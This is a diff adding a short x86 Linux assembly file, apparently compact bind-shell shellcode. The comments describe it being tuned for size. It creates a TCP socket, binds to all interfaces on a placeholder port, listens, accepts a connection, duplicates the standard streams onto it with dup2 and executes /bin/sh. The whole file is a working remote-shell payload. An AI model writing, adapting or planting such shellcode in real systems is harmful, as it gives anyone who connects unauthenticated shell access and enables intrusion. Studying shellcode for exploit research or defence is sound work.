@@ -1,0 +1,61 @@
+global _start
+
+section .text
+_start:
+	xor eax, eax
+	xor esi, esi		; will always hold the value 0
+	cdq			; set edx to zero as well, by sign extending eax
+
+	mov ax, 0x167		; use mov instead of push imm16 and pop r16
+	; int socket(int, int, int)
+	push 0x2		; PF_INET
+	pop ebx			; domain
+	push 0x1		; SOCK_STREAM
+	pop ecx			; type
+	; edx (protocol) initialized to zero by the cdq instruction above
+	int 0x80
+
+	xchg ebx, eax		; fd on ebx from this point below
+	mov ax, 0x169		; use mov instead of push imm16 and pop r16
+	; int bind(int, const struct sockaddr *, socklen_t)
+	push esi		; INADDR_ANY
+	push word PORT		; port in network byte order
+	push word 0x2		; AF_INET
+	mov ecx, esp		; addr
+	push 0x10		; 16 bytes in total
+	pop edx			; addrlen
+	int 0x80
+
+	mov ax, 0x16b		; use mov instead of push imm16 and pop r16
+	; int listen(int, int)
+	xor ecx, ecx		; backlog
+	int 0x80
+
+	mul ecx			; set edx (addrlen) to zero
+	mov ax, 0x16c		; use mov instead of push imm16 and pop r16
+	; int accept4(int, struct sockaddr *, socklen_t *, int)
+	; ecx (addr) is already zero from the above listen(2)
+	; edx (addrlen) is already zero
+	; esi (flags) is already zero
+	int 0x80
+
+	xchg ebx, eax		; fd
+	inc ecx			; zero from the above listen(2)
+	inc ecx			; newfd
+bind_dup2_loop:
+	push 0x3f
+	; int dup2(int, int)
+	pop eax	
+	int 0x80
+	dec ecx
+	jns bind_dup2_loop	; don't jump if ecx is positive
+
+	push eax		; eax is zero from the dup2(2) above (stdin fd)
+	mov al, 0xb
+	; int execve(const char *, char *const [], char *const [])
+	push 0x68732f6e		; n/sh
+	push 0x69622f2f		; //bi
+	mov ebx, esp		; filename
+	inc ecx			; ecx (argv) is 0xffffffff from the above dup(2)
+	; edx is already zero from the above accept4(2)
+	int 0x80
